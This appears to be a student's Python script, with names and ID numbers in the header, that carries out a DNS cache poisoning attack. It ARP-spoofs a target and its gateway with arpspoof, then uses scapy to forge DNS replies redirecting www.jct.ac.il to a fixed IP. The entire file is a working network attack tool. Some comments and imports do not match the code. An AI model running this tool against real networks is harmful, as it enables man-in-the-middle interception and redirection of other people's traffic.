# Ariel Bar Kalifa 214181604
# Yedidya Marashe 213661499

import argparse
import time
from subprocess import run as subprocess_run
from multiprocessing import Process
from scapy.all import *
from scapy.layers.inet import UDP, IP

IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"


def validate_ip_address(address):
    """
    Validate an ip address for argparse constraint matching.
    """
    if re.match(IP_REGEX, address):
        return address
    raise argparse.ArgumentTypeError('invalid value for ip argument (src or target)')


def arpspoof_dns_server(target, gw, iface):
    """
    arpspoof target and gw to be in the middle using kali tool "arpspoof"
    """
    print("[*] arp-spoofing target and gateway")
    subprocess.run(["arpspoof", "-i", iface, "-t", target, gw], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def dns_callback(pkt):
    """
    callback function for dns requests
    """
    # check if the packet is a dns request
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        # check if the packet is for www.jct.ac.il
        if pkt.getlayer(DNS).qd.qname.decode() == "www.jct.ac.il.":
            # spoof a dns response for www.example.com
            print("[*] spoofing DNS response for www.jct.ac.il")

            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                            DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="93.184.216.34"))
            send(spoofed_pkt, verbose=0)


def spoof(args):
    """
    first, arpspoof args.target and gw to be in the middle. next, handle all dns requests regulary
    except for www.jct.ac.il. spoof that to 100.100.100.100
    """
    # get gateway ip using scapy
    gw = conf.route.route("0.0.0.0")[2]
    # arpspoof args.target and gw to be in the middle
    arpspoof_process = Process(target=arpspoof_dns_server, args=(args.target, gw, args.iface))
    arpspoof_process.start()
    time.sleep(1)
    # listen for dns requests
    sniff(filter="udp and port 53", prn=dns_callback, store=0)
    arpspoof_process.join()


def main():
    # initialize argument parser for command line
    parser = argparse.ArgumentParser(description="DNS cache poisoning attack")
    parser.add_argument("-i", "--iface", help="Interface you wish to use", choices=get_if_list())
    parser.add_argument("-t", "--target", help="IP of target DNS server", type=validate_ip_address)

    args = parser.parse_args()
    spoof(args)


if __name__ == "__main__":
    main()
